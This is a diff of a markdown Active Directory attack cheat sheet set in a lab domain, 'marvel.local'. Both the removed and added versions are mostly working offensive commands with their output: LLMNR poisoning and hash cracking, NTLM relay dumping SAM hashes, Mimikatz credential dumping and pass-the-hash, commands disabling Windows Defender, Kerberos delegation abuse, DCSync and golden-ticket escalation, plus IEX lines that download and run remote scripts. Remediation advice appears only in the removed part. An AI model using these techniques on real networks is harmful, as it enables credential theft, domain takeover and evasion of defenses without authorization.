@@ -1,186 +1,136 @@
-# Active Directory Attacks
-Active Directory Cheat Sheet
+# Active Directory Cheat Sheet
+Domain Demolition with Frank Castle and essenital tools.
 
-#### LLMNR/NBT-NS poisoning 
-
-`responder -I eht0 -rdw`
+## Basic Domain Enumeration
+Gathering information using Powerview.ps1
 ```
-[+] Listening for events...
-[SMB] NTLMv2-SSP Client   : 192.168.22.137
-[SMB] NTLMv2-SSP Username : MARVEL\fcastle
-[SMB] NTLMv2-SSP Hash     : fcastle::MARVEL:93b1788c58f638fa:B2CA7875629275D309D734EC71F9E286:0101000000000000C0653150DE09D2013126B37886358E89000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000006010A3B377FCEC86F76295A06081F0D3B51DCECFF04B43D87CAF05972C41D0A80A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00320032002E003100380033000000000000000000
-```
-In order to crack hash run hashcat: `hashcat64.exe -m 5600 hash.txt rockyou.txt`
-```
-Watchdog: Temperature abort trigger set to 90c
- 
-Dictionary cache hit:
-* Filename..: rockyou.txt
-* Passwords.: 14344384
-* Bytes.....: 139921497
-* Keyspace..: 14344384
- 
-FCASTLE::MARVEL:93b1788c58f638fa:b2ca7875629275d309d734ec71f9e286:0101000000000000c0653150de09d2013126b37886358e89000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d201060004000200000008003000300000000000000001000000002000006010a3b377fcec86f76295a06081f0d3b51dcecff04b43d87caf05972c41d0a80a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00320032002e003100380033000000000000000000:Password123
- 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Type........: NetNTLMv2
-Hash.Target......: FCASTLE::MARVEL:93b1788c58f638fa:b2ca7875629275d309...000000
-Time.Started.....: Fri Jan 10 12:58:20 2020 (0 secs)
-Time.Estimated...: Fri Jan 10 12:58:20 2020 (0 secs)
+PS C:\ad> Get-NetDomain
 
-```
-Recommendations:
 
-```
-Best option is to disable LLMNR and NBT-NS.
-If company must use LLMNR and NBT-NS, enable Network Access Control (if attacker cannot access to networ, tha attack can not be performed )
-Require Strong user password (e.g. >12 characters in lengt and limit common word usage)
-References:
-https://cccsecuritycenter.org/remediation/llmnr-nbt-ns
-```
+Forest                  : marvel.local
+DomainControllers       : {DC1.us.marvel.local}
+Children                : {}
+DomainMode              : Unknown
+DomainModeLevel         : 7
+Parent                  : marvel.local
+PdcRoleOwner            : DC1.us.marvel.local
+RidRoleOwner            : DC1.us.marvel.local
+InfrastructureRoleOwner : DC1.us.marvel.local
+Name                    : us.marvel.local
 
-#### Token Impersonation (meterpreter)
-Requirements: 
-- NT AUTHORITY SYSTEM
-- meterpreter proc arch = sys arch
-```
-meterpreter > load incognito 
-Loading extension incognito...Success.
-meterpreter > list_tokens 
-Usage: list_tokens <list_order_option>
+PS C:\ad> Get-NetDomainTrust -Domain marvel.local
 
-Lists all accessible tokens and their privilege level
+SourceName    TargetName         TrustType TrustDirection
+----------    ----------         --------- --------------
+marvel.local us.marvel.local ParentChild  Bidirectional
 
-OPTIONS:
 
-    -g        List tokens by unique groupname
-    -u        List tokens by unique username
+PS C:\ad> Get-NetForestTrust
 
-meterpreter > list_tokens -u
 
-Delegation Tokens Available
-========================================
-Font Driver Host\UMFD-0
-Font Driver Host\UMFD-1
-Font Driver Host\UMFD-2
-MARVEL\Administrator
-MARVEL\fcastle
-NT AUTHORITY\LOCAL SERVICE
-NT AUTHORITY\NETWORK SERVICE
-NT AUTHORITY\SYSTEM
-Window Manager\DWM-1
-Window Manager\DWM-2
+TopLevelNames            : {disney.local}
+ExcludedTopLevelNames    : {}
+TrustedDomainInformation : {disney.local}
+SourceName               : marvel.local
+TargetName               : disney.local
+TrustType                : Forest
+TrustDirection           : Bidirectional
 
-Impersonation Tokens Available
-========================================
-No tokens available
 
-meterpreter > getuid 
-Server username: NT AUTHORITY\SYSTEM
-meterpreter > impersonate_token MARVEL\\Administrator
-[+] Delegation token available
-[+] Successfully impersonated user MARVEL\Administrator
-```
-Recommendations:
+PS C:\ad> (Get-DomainComputer -Domain disney.local).name # in order to find machines across the trust we need to specify the domain
+DS-DC1
+DS-DBREPORT
+DS-ITSTAFF
+DS-MICKEY
 
 ```
-TBA
-```
-Ps. If there is possibility to run meterpreter on machine, there is no Antivirus protection or Windows Defender is disabled.
-`Enable Windows Defender Real-Timer Protection.`
 
-#### NTLM Relay
-
-Change setings in Responder.conf
-```
-root@marvel:~# cat /usr/share/responder/Responder.conf 
-[Responder Core]
-
-; Servers to start
-SQL = On
-SMB = Off
-RDP = On
-Kerberos = On
-FTP = On
-POP = On
-SMTP = On
-IMAP = On
-HTTP = Off
-HTTPS = On
-DNS = On
-LDAP = On
+## Lateral movement:
+### with Powershell:
 
 ```
-Fire up Responder
-`responder -rdwv -I eth0`
-Second Terminal  Fire up ntlmrealyx.pl from Impacket
-`python ntlmrelayx.py -tf target.txt  -smb2support`
+PS C:\Windows\system32> New-PSSession -ComputerName HYDRA
 
-Output from Responder:
-```
-[HTTP] Sending NTLM authentication request to 192.168.22.213
-[HTTP] GET request from: 192.168.22.213   URL: / 
-[HTTP] Host             : 192.168.22.183 
-[HTTP] NTLMv2 Client   : 192.168.22.213
-[HTTP] NTLMv2 Username : MARVEL\fcastle
-[HTTP] NTLMv2 Hash     : fcastle::MARVEL:2b2108757091455d:688F63B5623FF9BBC230ACFB596117C4:010100000000000095CBA4840BC2D5014512A438AF3F7D97000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000100000536C39E55E2469C08DAC46B0D5BB77645063D14D65BAE14C2AA4565A39A03E8A0A001000920918B91B320ACA2234D7731132F4070900260048005400540050002F003100390032002E003100360038002E00320032002E003100380033000000000000000000
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          HYDRA           RemoteMachine   Opened        Microsoft.PowerShell     Available
 
-```
-Output from ntlmrelayx.py:
-```
-Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
 
-[*] Protocol Client HTTPS loaded..
-[*] Protocol Client HTTP loaded..
-[*] Protocol Client LDAPS loaded..
-[*] Protocol Client LDAP loaded..
-[*] Protocol Client SMB loaded..
-[*] Protocol Client MSSQL loaded..
-[*] Protocol Client SMTP loaded..
-[*] Protocol Client IMAPS loaded..
-[*] Protocol Client IMAP loaded..
-[*] Running in relay mode to hosts in targetfile
-[*] Setting up SMB Server
-[*] Setting up HTTP Server
-
-[*] Servers started, waiting for connections
-[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
-[*] HTTPD: Received connection from 192.168.22.213, attacking target smb://192.168.22.212
-[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
-[*] Service RemoteRegistry is in stopped state
-[*] Service RemoteRegistry is disabled, enabling it
-[*] Starting service RemoteRegistry
-[*] Authenticating against smb://192.168.22.212 as MARVEL\fcastle SUCCEED
-[-] 'CurrentState'
-[*] Target system bootKey: 0x56ae13534cc70dccd75837d753af6890
-[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:99216251ddf5fa6c4c2761e417f5ad85:::
-Peter:1001:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
-[*] Done dumping SAM hashes for host: 192.168.22.212
-[*] Stopping service RemoteRegistry
-[*] Restoring the disabled state for service RemoteRegistry
-
-```
-Tips:
-- Check your Responder certs `Error Code: DLG_FLAGS_INVALID_CA
-DLG_FLAGS_SEC_CERT_CN_INVALID`
-
-Recommendations:
-```
-SMB Signing Disabled is a Medium risk vulnerability and should be Enabled to prevent NTLM Relay Attacks or move to Kerberos as the authentication protocol.
-References:
-https://beyondsecurity.com/scan-pentest-network-vulnerabilities-smb-signing-disabled.html
-https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/
+PS C:\Windows\system32> Enter-PSSession -ComputerName HYDRA
+[HYDRA]: PS C:\Users\Administrator\Documents> whoami
+marvel\administrator
 ```
 
-#### Kerberoasting
+```
+[HYDRA]: PS C:\Users\Administrator\Documents> exit
+PS C:\Windows\system32> invoke-command -ScriptBlock {whoami;hostname} -Computername HYDRA
+marvel\administrator
+HYDRA
+```
+Invoking command on another machine: 
 
-Find SPN in the forest:
+```
+PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA    
+PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
+marvel\administrator
+```
+Get Computer list that curent user have access to:
 
+```
+$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
+foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
+```
+Get Computer list that target $user have access to
+```
+$Username = 'domain\user'
+$Password = ConvertTo-SecureString -AsPlainText 'password'-Force
+
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password
+
+$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
+
+foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
+```
+Get MSSql db that current user have access to:
+```
+PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
+
+ComputerName                Instance                         Status
+------------                --------                         ------
+UFC-SQLDev.marvel.local    SQLDev.marvel.local,1433          Accessible
+UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible
+
+```
+
+## Local Privileges Escalation
+### Basicl Enumeration:
+```
+PS C:\>. .\PowerUp.ps1
+PS C:\>Invoke-AllChecks 
+```
+
+### AV and AMSI Evasion:
+TO bypass amsi and defender, there is possibility to turn if off with local administrator privileges:
+```
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+### Geting hashes with Mimikatz 
+```
+invoke-mimikatz -dumpcred 
+invoke-mimikatz -command 'privilege::debug token::elevate lsadump::sam'
+```
+### Passin the hashes with Mimikatz 
+```
+Invoke-Mimikatz -command "sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:C:\Users\fcastle\Desktop\PsExec64.exe" 
+```
+
+## Domain Privileges Escalation 
+### Looking for weak ACL in domain
+```
+Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
+```
+### Kerberoasting
 ```
 PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts'); Find-PSServiceAccounts
 Discovering service account SPNs in the AD Domain marvel.local
@@ -259,460 +209,87 @@ Started: Tue Jan 07 10:12:06 2020
 Stopped: Tue Jan 07 10:12:19 2020
 ```
 
-Recommendations:
+### Unconstrained Delegation
+Looking for machines that allow unconstrained delegation.
 ```
-We recommend ensuring service account passwords are longer than 25 characters.
-References:
-https://docs.microsoft.com/en-us/windows-server/networking/sdn/security/kerberos-with-spn
+PS C:\ad> (Get-DomainComputer -Unconstrained).cn 
+MVU-DC1
+MVU-PROD
 ```
-
-
-#### Pass The Hash
-
+In order to perform attack, MVU-PROD should be compromised and following command need to be executed:
 ```
-c:\Users\fcastle\Desktop>mimikatz.exe
-
-    lovekatz 2.2.0 (x64) #18362 Jan  9 2020 19:32:44
-  "lolxd" - (oe.eo)
-
-       >       -KATZ
-          > https:// ***/
-
-lovekatz # privilege::debug
-Privilege '20' OK
-
-lovekatz # sekurlsa::logonPasswords
-
-Authentication Id : 0 ; 5532529 (00000000:00546b71)
-Session           : Interactive from 2
-User Name         : Administrator
-Domain            : MARVEL
-Logon Server      : HYDRA
-Logon Time        : 1/10/2020 1:55:10 AM
-SID               : S-1-5-21-1806573636-3987246654-2051155295-500
-        msv :
-         [00000003] Primary
-         * Username : Administrator
-         * Domain   : MARVEL
-         * NTLM     : 58a478135a93ac3bf058a5ea0e8fdb71
-         * SHA1     : 0d7d930ac3b1322c8a1142f9b22169d4eef9e855
-         * DPAPI    : aceb14854d9c0a836f48b7a1760bd14a
-        tspkg :
-        kerberos :
-         * Username : Administrator
-         * Domain   : MARVEL.LOCAL
-         * Password : (null)
-        ssp :
-        CredMAN :
-[...]
-
-
-
-
-lovekatz # sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /run:"C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami"
-user    : Administrator
-domain  : MARVEL
-program : C:\Users\fcastle\Desktop\PsExec64.exe \\192.168.22.211 whoami
-impers. : no
-NTLM    : 58a478135a93ac3bf058a5ea0e8fdb71
-  |  PID  1984
-  |  TID  3820
-  |  LSA Process was already R/W
-  |  LUID 0 ; 9099117 (00000000:008ad76d)
-  \_ msv1_0   - data copy @ 000001E3DDFEA680 : OK !
-  \_ kerberos - data copy @ 000001E3DE0715D8
-   \_ aes256_hmac       -> null
-   \_ aes128_hmac       -> null
-   \_ rc4_hmac_nt       OK
-   \_ rc4_hmac_old      OK
-   \_ rc4_md4           OK
-   \_ rc4_hmac_nt_exp   OK
-   \_ rc4_hmac_old_exp  OK
-   \_ *Password replace @ 000001E3DDF34DE8 (32) -> null
+Invoke-Mimikatz –Command '"sekurlsa::tickets /export"
+Invoke-Mimikatz –Command '"kerberos::ptt C:\ad\SOMEUSER.kirbi"
 ```
-
-Output from second terminal
+### Constrained Delegation
+Looking for machines that allow constrained delegation:
+```
+PS C:\ad> (Get-DomainComputer -TrustedToAuth).cn 
+MVU-DB
 
 ```
-PsExec v2.2 - Execute processes remotely
-Copyright (C) 2001-2016 Mark Russinovich
-Sysinternals - www.sysinternals.com
-
-
-marvel\administrator
-whoami exited on 192.168.22.211 with error code 0.
-```
-
-cme
-```
-cme smb 192.168.22.211 -u Administrator -H '58a478135a93ac3bf058a5ea0e8fdb71' -x whoami
-SMB         192.168.22.211  445    HYDRA            [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:HYDRA) (domain:MARVEL) (signing:True) (SMBv1:True)
-SMB         192.168.22.211  445    HYDRA            [+] MARVEL\Administrator 58a478135a93ac3bf058a5ea0e8fdb71 (Pwn3d!)
-SMB         192.168.22.211  445    HYDRA            [+] Executed com
-```
-
-Recommendations:
-```
-Implement logon restrictions so your privileged account hashes are never stored where they can be extracted.
-References:
-https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
-```
-
-# Information Gathering
-Import AD module
-```
-PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
-```
-Get Domain info with AD Module
+Looking for object allowed to be delegated
 
 ```
-PS C:\Users\pparker> Get-ADDomain                                                                                       
+PS C:\ad\ADModule-master> Import-Module .\Microsoft.ActiveDirectory.Management.dll
+PS C:\ad\ADModule-master> Get-ADObject  -Filter {msDS-AllowedToDelegateTo -ne "$null"}
 
-DomainSID                          : S-1-5-21-1806573636-3987246654-2051155295
-AllowedDNSSuffixes                 : {}
-LastLogonReplicationInterval       :
-DomainMode                         : Windows2016Domain
-ManagedBy                          :
-LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=marvel,DC=loca
-                                     l}
-ChildDomains                       : {}
-ComputersContainer                 : CN=Computers,DC=marvel,DC=local
-DomainControllersContainer         : OU=Domain Controllers,DC=marvel,DC=local
-ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=marvel,DC=local
-Forest                             : marvel.local
-InfrastructureMaster               : HYDRA.marvel.local
-NetBIOSName                        : MARVEL
-PDCEmulator                        : HYDRA.marvel.local
-ParentDomain                       :
-RIDMaster                          : HYDRA.marvel.local
-SystemsContainer                   : CN=System,DC=marvel,DC=local
-UsersContainer                     : CN=Users,DC=marvel,DC=local
-SubordinateReferences              : {DC=ForestDnsZones,DC=marvel,DC=local, DC=DomainDnsZones,DC=marvel,DC=local,
-                                     CN=Configuration,DC=marvel,DC=local}
-DNSRoot                            : marvel.local
-LostAndFoundContainer              : CN=LostAndFound,DC=marvel,DC=local
-DeletedObjectsContainer            : CN=Deleted Objects,DC=marvel,DC=local
-QuotasContainer                    : CN=NTDS Quotas,DC=marvel,DC=local
-ReadOnlyReplicaDirectoryServers    : {}
-ReplicaDirectoryServers            : {HYDRA.marvel.local}
-DistinguishedName                  : DC=marvel,DC=local
-Name                               : marvel
-ObjectClass                        : domainDNS
-ObjectGuid                         : b3abf270-8d31-424f-8933-b5a18c1f5207
-PropertyNames                      : {AllowedDNSSuffixes, ChildDomains, ComputersContainer, DeletedObjectsContainer...}
-AddedProperties                    : {}
-RemovedProperties                  : {}
-ModifiedProperties                 : {PublicKeyRequiredPasswordRolling}
-PropertyCount                      : 30
 
-```
-
-Get Domain users with AD Module
-
-```
-PS C:\Users\pparker> Get-ADUser -Filter * -Properties *                                                                 
-
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : True
-SamAccountName     : Administrator
-SID                : S-1-5-21-1806573636-3987246654-2051155295-500
-DistinguishedName  : CN=Administrator,CN=Users,DC=marvel,DC=local
-Name               : Administrator
+DistinguishedName  : CN=someservice,CN=Users,DC=us,DC=marvel,DC=local
+Name               : someservice
 ObjectClass        : user
-ObjectGuid         : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+ObjectGuid         : 8612bef0-c62b-47d9-9085-b11e5ea71b1b
+PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}
 AddedProperties    : {}
 RemovedProperties  : {}
 ModifiedProperties : {}
-PropertyCount      : 107
+PropertyCount      : 4
 
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : False
-SamAccountName     : Guest
-SID                : S-1-5-21-1806573636-3987246654-2051155295-501
-DistinguishedName  : CN=Guest,CN=Users,DC=marvel,DC=local
-Name               : Guest
-ObjectClass        : user
-ObjectGuid         : 146f722a-23ea-4af7-a005-42463542788d
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
+DistinguishedName  : CN=UFC-DB1,OU=Servers,DC=us,DC=marvel,DC=local
+Name               : MVU-DB1
+ObjectClass        : computer
+ObjectGuid         : 3e68b455-f55a-443e-b227-2e833e7caedb
+PropertyNames      : {DistinguishedName, Name, ObjectClass, ObjectGUID}
 AddedProperties    : {}
 RemovedProperties  : {}
 ModifiedProperties : {}
-PropertyCount      : 105
-
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : False
-SamAccountName     : DefaultAccount
-SID                : S-1-5-21-1806573636-3987246654-2051155295-503
-DistinguishedName  : CN=DefaultAccount,CN=Users,DC=marvel,DC=local
-Name               : DefaultAccount
-ObjectClass        : user
-ObjectGuid         : 4d43f4cc-f470-4b9b-9a94-42c5d6773c54
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 105
-
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : False
-SamAccountName     : krbtgt
-SID                : S-1-5-21-1806573636-3987246654-2051155295-502
-DistinguishedName  : CN=krbtgt,CN=Users,DC=marvel,DC=local
-Name               : krbtgt
-ObjectClass        : user
-ObjectGuid         : dac1e75e-809d-4c80-ba08-1dfbb915f4f2
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 109
-
-GivenName          : Frank
-Surname            : Castle
-UserPrincipalName  : fcastle@marvel.local
-Enabled            : True
-SamAccountName     : fcastle
-SID                : S-1-5-21-1806573636-3987246654-2051155295-1103
-DistinguishedName  : CN=Frank Castle,CN=Users,DC=marvel,DC=local
-Name               : Frank Castle
-ObjectClass        : user
-ObjectGuid         : b492bfca-6c18-460e-9699-eb55b1c6e81a
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 106
-
-GivenName          : Peter
-Surname            : Parker
-UserPrincipalName  : pparker@marvel.local
-Enabled            : True
-SamAccountName     : pparker
-SID                : S-1-5-21-1806573636-3987246654-2051155295-1105
-DistinguishedName  : CN=Peter Parker,CN=Users,DC=marvel,DC=local
-Name               : Peter Parker
-ObjectClass        : user
-ObjectGuid         : afdaab86-9be3-4a3c-a87c-71f4db56894a
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 106
-
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : True
-SamAccountName     : spn1
-SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
-DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
-Name               : spn1
-ObjectClass        : user
-ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
-PropertyNames      : {AccountExpirationDate, accountExpires, AccountLockoutTime, AccountNotDelegated...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 107
-
+PropertyCount      : 4
 
 ```
-Get Domain Users logins with WMIC
-
+Preconditions: MVU-DB1 Compromised, NTLM Hashes dumped, Kekeo.exe and Mimikatz:
 ```
- wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
-```
+PS C:\ad> kekeo.exe "tgt::ask /user:someservice /domain:us.marvel.local /ntlm:${NTLM}"
 
-Get Domain user info with AD module
-```
+PS C:\ad>  kekeo.exe "tgs::s4u /tgt:TGT_someservice@US.MARVEL.LOCAL_krbtgt~us.marvel.local@US.MARVEL.LOCAL.kirbi /user:Administrator@us.marvel.local /service:time/MVU-DC1.us.marvel.local|ldap/MVY-DC1.us.marvel.local
 
-PS C:\Users\pparker> Get-ADUser -Identity spn1                                                                          
-
-GivenName          :
-Surname            :
-UserPrincipalName  :
-Enabled            : True
-SamAccountName     : spn1
-SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
-DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
-Name               : spn1
-ObjectClass        : user
-ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
-PropertyNames      : {DistinguishedName, Enabled, GivenName, Name...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 10
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.marvel.local@US.MARVEL.LOCAL_ldap~UFC-DC1.us.marvel.local@US.MARVEL.LOCAL_ALT.kirbi"'
 
 ```
 
-Get *admin* groups in domian 
-
+## Presistance
+### DC Sync
+Preconditions Domain Administrator Privileges:
 ```
-PS C:\Users\pparker> Get-ADGroup -Filter {name -like "*admin*"} | select name                                           
-Name
-----
-Administrators
-Hyper-V Administrators
-Storage Replica Administrators
-Schema Admins
-Enterprise Admins
-Domain Admins
-Key Admins
-Enterprise Key Admins
-DnsAdmins
-
+invoke-mimikatz -Command '"lsadump::dcsync /user:marvel\Administrator"'
+```
+DCSync feature for getting krbtgt hash, which can be use to create golden tickes: 
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:marvel\krbtgt"
 ```
 
-Get users of Group Domain Admins with AD module
+## Escalation Across Domain Trust
+Admin of child domain, krbtgt hash, access to DC
+
+Geting the sids of the parent domain 
 ```
-PS C:\Users\pparker> Get-ADGroupMember -Identity "Domain Admins" -Recursive                                             
-
-SamAccountName     : Administrator
-SID                : S-1-5-21-1806573636-3987246654-2051155295-500
-DistinguishedName  : CN=Administrator,CN=Users,DC=marvel,DC=local
-Name               : Administrator
-ObjectClass        : user
-ObjectGuid         : 75fffaa5-a4f3-4da1-8b63-2f1b8fdf3581
-PropertyNames      : {distinguishedName, name, objectClass, objectGUID...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 6
-
-SamAccountName     : spn1
-SID                : S-1-5-21-1806573636-3987246654-2051155295-1109
-DistinguishedName  : CN=spn1,CN=Users,DC=marvel,DC=local
-Name               : spn1
-ObjectClass        : user
-ObjectGuid         : 344136c6-f5e0-470f-b3aa-78cd7b90ca20
-PropertyNames      : {distinguishedName, name, objectClass, objectGUID...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 6
+PS C:\ad> (New-Object System.Security.Principal.NTAccount("disney.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+S-1-5-21-493355955-4213530352-789496340-502
+change 502 to 519
+Invoke-Mimikatz -Command '"kerberos::golden /domain:us.marvel.local /sid:{marvel-domain-sid} /sids:S-1-5-21-493355955-4213530352-789496340-519 /user:Administrator /krbtgt:$krbthash  /ticket:C:\Users\Administrator\Desktop\trust_tgt.kirbi"'
+PS C:\ad> invoke-mimikatz -Command '"kerberos::ptt C:\Users\Administrator\Desktop\trust_tgt.kirbi"'
 
 ```
-
-Get User Groups with AD module
-
-```
-PS C:\Users\pparker> Get-ADPrincipalGroupMembership -Identity spn1                                                      
-
-GroupScope         : Global
-GroupCategory      : Security
-SamAccountName     : Domain Users
-SID                : S-1-5-21-1806573636-3987246654-2051155295-513
-DistinguishedName  : CN=Domain Users,CN=Users,DC=marvel,DC=local
-Name               : Domain Users
-ObjectClass        : group
-ObjectGuid         : c5f46f7f-4f27-44cb-8787-3738c0d840cc
-PropertyNames      : {distinguishedName, GroupCategory, GroupScope, name...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 8
-
-GroupScope         : Global
-GroupCategory      : Security
-SamAccountName     : Domain Admins
-SID                : S-1-5-21-1806573636-3987246654-2051155295-512
-DistinguishedName  : CN=Domain Admins,CN=Users,DC=marvel,DC=local
-Name               : Domain Admins
-ObjectClass        : group
-ObjectGuid         : cbb57bc7-d35c-4351-87a6-de121d3b3e7f
-PropertyNames      : {distinguishedName, GroupCategory, GroupScope, name...}
-AddedProperties    : {}
-RemovedProperties  : {}
-ModifiedProperties : {}
-PropertyCount      : 8
-```
-
-Get all computers in the domain with AD module
-```
-PS C:\Users\pparker> Get-ADComputer -Filter * -Properties * | select name                                               
-Name
-----
-HYDRA
-PUNISHER
-DESKTOP-DGQM4HL
-SPODERMAN
-SPIDERMAN
-```
-# Lateral Movement with Powershell:
-
-```
-PS C:\Windows\system32> New-PSSession -ComputerName HYDRA
-
- Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
- -- ----            ------------    ------------    -----         -----------------     ------------
-  1 WinRM1          HYDRA           RemoteMachine   Opened        Microsoft.PowerShell     Available
-
-
-PS C:\Windows\system32> Enter-PSSession -ComputerName HYDRA
-[HYDRA]: PS C:\Users\Administrator\Documents> whoami
-marvel\administrator
-```
-
-```
-[HYDRA]: PS C:\Users\Administrator\Documents> exit
-PS C:\Windows\system32> invoke-command -ScriptBlock {whoami;hostname} -Computername HYDRA
-marvel\administrator
-HYDRA
-```
-
-
-```
-PS C:\Windows\system32> $sess = New-PSSession -ComputerName HYDRA    
-PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
-marvel\administrator
-```
-# Get Computer list that curent user have access to:
-
-```
-$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
-foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer ).Name }
-```
-# Get Computer list that target $user have access to
-```
-$Username = 'domain\user'
-$Password = ConvertTo-SecureString -AsPlainText 'password'-Force
-
-$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$Password
-
-$computers=( Get-WmiObject -Namespace root\directory\ldap -Class ds_computer | select  -ExpandProperty ds_cn)
-
-foreach ($computer in $computers) { (Get-WmiObject Win32_ComputerSystem -ComputerName $computer -Credential $cred ).Name }
-```
-# Get MSSql db that current user have access to:
-```
-PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
-
-ComputerName                Instance                         Status
-------------                --------                         ------
-UFC-SQLDev.marvel.local    SQLDev.marvel.local,1433          Accessible
-UFC-SQLDev.marvel.local    SQLDev.marvel.local               Accessible
-
-```
-# AV and AMSI Evasion with local admin:
-```
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
-
